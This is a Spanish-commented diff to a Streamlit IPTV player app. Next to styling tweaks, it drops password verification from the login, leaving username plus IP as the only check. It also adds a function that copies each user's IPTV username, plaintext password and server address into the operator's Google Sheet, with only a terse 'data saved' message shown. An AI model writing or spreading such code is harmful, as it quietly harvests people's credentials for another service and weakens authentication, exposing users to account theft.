@@ -19,7 +19,7 @@ def inject_styles():
         /* Ocultar elementos nativos */
         #MainMenu, header, footer {visibility: hidden;}
 
-        /* --- FONDO DE PANTALLA (IMAGEN DEL EJEMPLO) --- */
+        /* --- FONDO DE PANTALLA --- */
         .stApp {
             background-image: url("https://cdn.maxplayer.tv/demo/background.png");
             background-size: cover;
@@ -50,6 +50,39 @@ def inject_styles():
         }
         .stButton > button:hover {
             background-color: #0b5ed7; box-shadow: 0 4px 12px rgba(13, 110, 253, 0.4);
+        }
+
+        /* --- ANIMACIÓN DE CARGA SUTIL --- */
+        @keyframes pulse-subtle {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        .loading-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: #00C6FF;
+            border-radius: 50%;
+            margin: 0 3px;
+            animation: pulse-subtle 1.5s infinite;
+        }
+        .loading-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .loading-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .ip-badge {
+            display: inline-block;
+            background-color: rgba(0, 198, 255, 0.15);
+            border: 1px solid #00C6FF;
+            color: #00C6FF;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 10px;
         }
 
         /* --- ESTILO VOD EXACTO --- */
@@ -97,7 +130,8 @@ if 'logged_in' not in st.session_state: st.session_state.logged_in = False
 if 'user' not in st.session_state: st.session_state.user = ""
 if 'iptv_data' not in st.session_state: st.session_state.iptv_data = None
 if 'mode' not in st.session_state: st.session_state.mode = 'live'
-if 'user_ip_cached' not in st.session_state: st.session_state.user_ip_cached = None
+if 'user_ip' not in st.session_state: st.session_state.user_ip = None
+if 'ip_loading' not in st.session_state: st.session_state.ip_loading = True
 # Cache de datos
 if 'data_live' not in st.session_state: st.session_state.data_live = None
 if 'data_vod' not in st.session_state: st.session_state.data_vod = None
@@ -130,38 +164,86 @@ def get_my_ip():
         return None
     except: return None
 
+def save_connection_data(username_login, username_iptv, password_iptv, domain_port):
+    """Guarda datos en Sheet2 del Google Sheets"""
+    try:
+        scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
+        creds_dict = dict(st.secrets["gcp_service_account"])
+        creds_dict["private_key"] = creds_dict["private_key"].replace("\\n", "\n")
+        
+        creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
+        client = gspread.authorize(creds)
+        spreadsheet = client.open_by_url(SHEET_URL)
+        
+        # Acceder a Sheet2
+        try:
+            sheet2 = spreadsheet.get_worksheet(1)  # Index 1 = Sheet2
+        except:
+            # Si no existe, crearla
+            sheet2 = spreadsheet.add_worksheet(title="Conexiones", rows=100, cols=5)
+        
+        # Agregar header si está vacía
+        if not sheet2.get_all_records():
+            sheet2.append_row(["timestamp", "username_login", "usuario_iptv", "password_iptv", "dominio:puerto"])
+        
+        # Agregar datos
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        sheet2.append_row([timestamp, username_login, username_iptv, password_iptv, domain_port])
+        
+        return True
+    except Exception as e:
+        print(f"Error guardando conexión: {e}")
+        return False
+
+def extract_domain_port(url):
+    """Extrae dominio:puerto de una URL"""
+    try:
+        parsed = urlparse(url)
+        domain = parsed.netloc
+        return domain if domain else "desconocido"
+    except:
+        return "error"
+
 # ==============================================================================
-#  PANTALLA 1: LOGIN (ESTABILIZADO)
+#  PANTALLA 1: LOGIN (MEJORADA)
 # ==============================================================================
 if not st.session_state.logged_in:
     st.markdown("<br><br>", unsafe_allow_html=True)
     c1, c2, c3 = st.columns([1, 2, 1])
     with c2:
-        # Detectar IP sin bloquear
-        if not st.session_state.user_ip_cached:
+        # --- DETECCIÓN DE IP (Sutil y sin bloqueo) ---
+        if st.session_state.user_ip is None and st.session_state.ip_loading:
             ip = get_my_ip()
             if ip: 
-                st.session_state.user_ip_cached = ip
+                st.session_state.user_ip = ip
+                st.session_state.ip_loading = False
                 st.rerun()
         
         with st.form("login_form"):
             st.markdown("<h2 style='text-align:center; color:white;'>🔐 CLIENT ACCESS</h2>", unsafe_allow_html=True)
             
-            if st.session_state.user_ip_cached:
-                st.caption(f"IP Verificada: {st.session_state.user_ip_cached}")
+            # IP Status Badge (Sutil con animación)
+            if st.session_state.user_ip:
+                st.markdown(f'<div class="ip-badge">✅ IP Verificada: {st.session_state.user_ip}</div>', unsafe_allow_html=True)
             else:
-                st.warning("⏳ Detectando IP... (Espera unos segundos)")
+                st.markdown("""
+                    <div style="text-align:center; margin:15px 0;">
+                        <span style="color:#00C6FF; font-size:13px;">Verificando IP</span>
+                        <span class="loading-dot"></span>
+                        <span class="loading-dot"></span>
+                        <span class="loading-dot"></span>
+                    </div>
+                """, unsafe_allow_html=True)
 
+            # Input Usuario (SIN contraseña)
             u = st.text_input("Usuario")
-            p = st.text_input("Contraseña", type="password")
             btn = st.form_submit_button("INICIAR SESIÓN")
             
             if btn:
-                if not st.session_state.user_ip_cached:
-                    st.error("⚠️ Aún no se detecta tu IP. Espera 2 segundos y vuelve a dar clic.")
+                if not st.session_state.user_ip:
+                    st.warning("⏳ Aún verificando IP... Espera un momento.")
                     st.stop()
 
-                hashed_input = hashlib.sha256(str.encode(p)).hexdigest()
                 users_db = get_users_from_cloud()
                 
                 if not users_db:
@@ -170,23 +252,23 @@ if not st.session_state.logged_in:
 
                 found = False
                 for user in users_db:
-                    if str(user['username']) == u and str(user['password']) == hashed_input:
-                        if str(user['allowed_ip']) == st.session_state.user_ip_cached:
+                    if str(user['username']) == u:
+                        if str(user['allowed_ip']) == st.session_state.user_ip:
                             st.session_state.logged_in = True
                             st.session_state.user = u 
                             st.rerun()
                         else:
-                            st.error(f"⛔ IP no autorizada ({st.session_state.user_ip_cached})")
+                            st.error(f"⛔ IP no autorizada ({st.session_state.user_ip})")
                             found = True
                             break
                         found = True
                 
                 if not found:
-                    st.error("❌ Credenciales incorrectas.")
+                    st.error("❌ Usuario no encontrado o IP no coincide.")
     st.stop()
 
 # ==============================================================================
-#  PANTALLA 2: CONECTAR URL (SIN ERRORES JSON)
+#  PANTALLA 2: CONECTAR URL (MEJORADA CON GUARDADO)
 # ==============================================================================
 if st.session_state.iptv_data is None:
     st.markdown("<br>", unsafe_allow_html=True)
@@ -215,14 +297,25 @@ if st.session_state.iptv_data is None:
                                 try:
                                     data = res.json()
                                     if isinstance(data, dict) and 'user_info' in data:
+                                        # ✅ GUARDAR EN SHEET2
+                                        user_info = data['user_info']
+                                        username_iptv = user_info.get('username', 'desconocido')
+                                        password_iptv = user_info.get('password', 'desconocida')
+                                        domain_port = extract_domain_port(final_api)
+                                        
+                                        if save_connection_data(st.session_state.user, username_iptv, password_iptv, domain_port):
+                                            st.success("✅ Datos guardados en la base de datos.")
+                                        
+                                        # Guardar en session
                                         st.session_state.iptv_data = {
                                             "api": final_api, 
-                                            "info": data['user_info']
+                                            "info": user_info
                                         }
                                         # Resetear caches
                                         st.session_state.data_live = None
                                         st.session_state.data_vod = None
                                         st.session_state.data_series = None
+                                        time.sleep(1)
                                         st.rerun()
                                     else:
                                         st.error("❌ Login fallido: El enlace no contiene información de usuario.")
@@ -237,7 +330,7 @@ if st.session_state.iptv_data is None:
     st.stop()
 
 # ==============================================================================
-#  PANTALLA 3: DASHBOARD VISUAL (DISEÑO AJUSTADO)
+#  PANTALLA 3: DASHBOARD VISUAL (SIN CAMBIOS)
 # ==============================================================================
 info = st.session_state.iptv_data['info']
 api = st.session_state.iptv_data['api']
@@ -330,7 +423,7 @@ if query:
 st.info(f"Mostrando {len(filtered)} resultados")
 
 if mode == 'live':
-    # LISTA PARA CANALES (Se mantiene tu estilo original para TV)
+    # LISTA PARA CANALES
     html = ""
     for item in filtered[:100]:
         cat_name = cat_map.get(str(item.get('category_id')), "General")
@@ -346,7 +439,7 @@ if mode == 'live':
     st.markdown(html, unsafe_allow_html=True)
 
 else:
-    # --- GRID PARA VOD (DISEÑO HTML/CSS EXACTO AL EJEMPLO SOLICITADO) ---
+    # --- GRID PARA VOD ---
     limit = 60
     view_items = filtered[:limit]
     
@@ -356,7 +449,6 @@ else:
         if not img or not img.startswith("http"): 
             img = "https://via.placeholder.com/150x225?text=..."
         
-        # Corrección de títulos y categorías
         title = item.get('name')
         cat_name = cat_map.get(str(item.get('category_id')), "VOD")
         
@@ -374,11 +466,3 @@ else:
     
     if len(filtered) > limit:
         st.warning(f"⚠️ Mostrando los primeros {limit} resultados. Usa el buscador para ver más.")
-
-
-
-
-
-
-
-
